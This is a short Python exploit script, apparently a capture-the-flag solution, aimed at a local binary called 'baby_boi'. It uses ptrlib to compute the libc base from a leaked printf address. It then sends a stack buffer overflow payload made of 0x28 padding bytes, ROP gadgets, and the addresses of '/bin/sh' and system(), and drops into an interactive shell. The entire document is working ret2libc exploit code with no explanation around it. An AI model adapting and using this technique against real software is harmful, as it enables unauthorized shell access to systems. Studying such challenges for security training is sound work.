from ptrlib import *

libc = ELF("./libc-2.27.so")
sock = Process("./baby_boi")

sock.recvuntil(": ")
libc_base = int(sock.recvline(), 16) - libc.symbol("printf")
logger.info("libc base = " + hex(libc_base))

payload = b'A' * 0x28
payload += p64(0x00400794)
payload += p64(0x00400793)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.sendline(payload)

sock.interactive()
